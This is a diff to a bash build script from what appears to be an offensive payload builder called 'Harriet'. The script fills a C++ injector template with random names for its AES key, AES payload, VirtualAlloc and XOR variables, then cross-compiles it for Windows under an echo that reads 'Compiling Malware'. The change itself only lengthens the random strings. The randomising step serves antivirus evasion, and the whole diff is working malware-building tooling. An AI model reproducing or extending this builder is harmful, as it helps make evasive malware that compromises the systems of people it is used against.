@@ -81,24 +81,24 @@ cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
 Random3=$(cat shell.txt)
 sed -i "s/Random3/$Random3/g" Harriet/FULLInj/Resources/template.cpp
 #AES KEY
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-8} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
 Random4=$(cat shell.txt)
 sed -i "s/Random4/$Random4/g" Harriet/FULLInj/Resources/template.cpp
 #AES Payload
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-13} | head -n 1 > shell.txt
 Random5=$(cat shell.txt)
 sed -i "s/Random5/$Random5/g" Harriet/FULLInj/Resources/template.cpp
 #VIRTUALALLOC VARIABLE NAME
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > shell.txt
 Random6=$(cat shell.txt)
 sed -i "s/Random6/$Random6/g" Harriet/FULLInj/Resources/template.cpp
 #XOR FUNCTION VARIABLE NAME
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > shell.txt
 Random7=$(cat shell.txt)
 sed -i "s/Random7/$Random7/g" Harriet/FULLInj/Resources/template.cpp
 
 #Exec VARIABLE
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
 Random8=$(cat shell.txt)
 sed -i "s/Random8/$Random8/g" Harriet/FULLInj/Resources/template.cpp
 
@@ -150,7 +150,7 @@ rm proc*
 
 #Compiling Malware
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLInj/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -mwindows -lntdll -O2 -Os>/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLInj/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -mwindows -lntdll -O2 -Os >/dev/null 2>&1
 echo ""
 sleep 2
 rm shell*
